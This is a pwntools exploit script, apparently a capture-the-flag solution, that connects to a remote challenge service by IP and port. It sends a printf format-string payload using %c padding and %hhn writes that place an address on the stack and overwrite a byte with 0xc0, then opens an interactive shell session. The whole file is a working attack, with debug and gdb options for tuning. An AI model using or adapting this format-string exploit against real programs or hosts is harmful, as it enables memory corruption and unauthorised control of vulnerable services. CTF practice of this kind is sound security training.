from pwn import*
context.arch="amd64"
import shutil

# This resolves the absolute path (e.g., /usr/bin/kitty) and tricks pwntools into ignoring it
context.terminal = [shutil.which('kitty'), 'sh', '-c']
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 local + gdb
nc="nc 20.199.16.42 20058"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"""
    b* vuln + 86
    c
    x/50a $sp
    """)
    pause()
else:
    p=remote(r[1],int(r[2]),ssl=False)



payload = "%c%c%c%c%c%c%50c%hhn%136c%7$hhn" #192-50-6   // write &i into stack and overwrite it with  0xc0 ,,
#we can't use $ in the first overwrite to avoid printf caching.

p.sendline(payload)



p.interactive()
